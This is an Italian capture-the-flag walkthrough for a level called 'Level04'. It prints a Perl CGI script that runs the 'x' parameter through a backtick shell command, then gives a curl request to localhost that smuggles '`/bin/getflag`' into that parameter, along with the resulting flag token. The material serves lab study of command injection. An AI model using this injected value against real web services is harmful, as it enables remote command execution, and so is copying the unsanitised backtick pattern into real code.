# Level04
### 1 passaggio:
Digitando `ls -l level04.pl` abbiamo:
```bash
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```
dunque flag04 è proprietario del file

### 2 passaggio:
Aprendo il file possiamo vedere il seguente script cgi in perl:
```perl
     1  #!/usr/bin/perl
     2  # localhost:4747
     3  use CGI qw{param};
     4  print "Content-type: text/html\n\n";
     5  sub x {
     6    $y = $_[0];
     7    print `echo $y 2>&1`;
     8  }
     9  x(param("x"));
```
Nella seconda riga ci suggerisce che sulla porta 4747 abbiamo qualcosa in ascolto e
lo script stampa il parametro `x`

### 3 passaggio:
Dunque è bastato semplicemente una richiesta con il comando `curl`
```
curl localhost:4747/level04.pl?x='`/bin/getflag`'
```
dove l'apice ` rende eseguibile ciò che verrà stampato e abbiamo la seguente stampa:
```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
